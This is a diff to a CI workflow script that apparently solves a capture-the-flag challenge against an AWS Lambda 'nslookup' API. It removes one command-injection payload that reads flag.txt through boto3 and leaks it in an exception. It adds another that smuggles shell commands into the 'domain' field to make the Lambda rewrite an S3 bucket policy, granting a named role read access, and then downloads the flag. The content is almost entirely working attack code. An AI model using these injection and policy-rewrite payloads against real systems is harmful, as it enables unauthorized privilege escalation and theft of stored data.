@@ -26,10 +26,24 @@ jobs:
           URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev/nslookup"
           BUCKET="codec4f26c862a321ef5"
           
-          echo "=== FIRING EXCEPTION PAYLOAD ==="
-          # This payload reads flag.txt via boto3 and intentionally raises an exception containing the flag!
-          PAYLOAD="{\"domain\": \"127.0.0.1; python3 -c \\\"import boto3; s3=boto3.client('s3'); f=s3.get_object(Bucket='${BUCKET}', Key='flag.txt')['Body'].read().decode(); raise Exception(f)\\\"\"}"
+          echo "=== 1. FORCING LAMBDA TO UPDATE S3 BUCKET POLICY ==="
+          # This command injection writes a policy that explicitly grants cicdRole s3:GetObject permission on the bucket
+          POLICY='{\"Version\":\"2012-10-17\",\"Statement\":[{\"Sid\":\"GrantCicdRead\",\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::009661764077:role/cicdRole\"},\"Action\":\"s3:GetObject\",\"Resource\":\"arn:aws:s3:::'"${BUCKET}"'/*\"}]}'
+          
+          PAYLOAD="{\"domain\": \"127.0.0.1; echo '${POLICY}' > /tmp/policy.json && aws s3api put-bucket-policy --bucket ${BUCKET} --policy file:///tmp/policy.json\"}"
           
           curl -s -X POST "$URL" \
             -H "Content-Type: application/json" \
             -d "$PAYLOAD"
+          
+          echo ""
+          echo "=== 2. WAITING 3 SECONDS FOR POLICY PROPAGATION ==="
+          sleep 3
+          
+          echo "=== 3. DOWNLOADING THE FLAG DIRECTLY ==="
+          # Now that your role has explicit policy access, download flag.txt with zero restrictions!
+          aws s3 cp "s3://${BUCKET}/flag.txt" ./final_flag.txt
+          
+          echo ""
+          echo "=== 4. BEHOLD YOUR GLORIOUS VICTORY ==="
+          cat ./final_flag.txt
